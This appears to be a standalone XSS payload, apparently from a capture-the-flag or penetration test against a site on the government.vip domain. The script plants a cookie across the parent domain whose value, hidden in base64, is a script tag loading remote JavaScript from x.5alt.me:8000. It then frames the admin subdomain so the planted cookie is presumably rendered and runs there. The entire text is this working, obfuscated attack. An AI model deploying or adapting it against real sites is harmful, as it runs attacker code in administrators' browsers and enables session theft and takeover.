<script>function createCookie(name,value,days) {
    if (days) {
        var date = new Date();
        date.setTime(date.getTime()+(days*24*60*60*1000));
        var expires = "; expires="+date.toGMTString();
    }
    else var expires = "";
    document.cookie = name+"="+value+expires+"; path=/; domain=.government.vip";
}
data='PHNjcmlwdCBzcmM9Ly94LjVhbHQubWU6ODAwMC8xLmpzPjwvc2NyaXB0Pg=='
createCookie('username', atob(data))
document.write('<iframe src=//admin.government.vip:8000 ></iframe>')</script>